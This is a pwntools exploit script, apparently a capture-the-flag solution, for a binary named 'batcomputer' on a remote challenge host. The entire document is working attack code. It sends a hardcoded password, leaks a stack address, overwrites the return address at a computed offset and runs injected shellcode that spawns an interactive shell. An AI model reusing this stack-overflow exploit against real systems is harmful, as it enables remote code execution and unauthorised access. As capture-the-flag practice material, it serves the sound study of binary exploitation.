from pwn import *

BINARY = './batcomputer'
host, port = '178.62.94.94:32173'.split(":")
context(arch="amd64", os="linux")

def load(mode):
	elf = context.binary = ELF(BINARY, checksec=False)
	# context.log_level = 'debug'
	if mode == 'gdb':
		return gdb.debug(BINARY, gdbscript=gdbscript)
	elif mode == 'remote':
		return remote(host, port)
	else:
		return process(BINARY)

gdbscript = '''
'''

p = load('remote')

#
# Step 0 - enumerate the binary
#
password = "b4tp@$$w0rd!" 		# from ghidra

#
# Step 1 - leaking a stack address
#
p.sendlineafter("> ", "1")
p.recvuntil("It was very hard, but Alfred managed to locate him: ")
leak = int(p.recvline().strip(), 16)
log.info("Leaked address: {}".format(hex(leak)))

#
# Step 2 - finding rip-offset
#
rip_offset = 84 		# using gdb-peda
	# manually
# p.sendlineafter("> ", "2")
# p.sendlineafter("Ok. Let's do this. Enter the password: ", password)
# payload = cyclic(137)
# p.sendlineafter("Enter the navigation commands: ", payload)
# p.sendlineafter("> ", "3")
# p.wait()
# rip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))

#
# Step 3 - injecting shellcode to the stack and running it (stack is executable)
#
p.sendlineafter("> ", "2")
p.sendlineafter("Ok. Let's do this. Enter the password: ", password)
# payload will look like: 	nop nop ... shellcode nop nop ... leaked_address
payload  = asm('nop') * 2
payload += asm(shellcraft.popad() + shellcraft.sh())
payload += asm('nop') * (rip_offset - len(payload))
payload += p64(leak)

p.sendlineafter("Enter the navigation commands: ", payload)
p.sendlineafter("> ", "3")

#
# Step 4- getting a shell
#
p.interactive() 	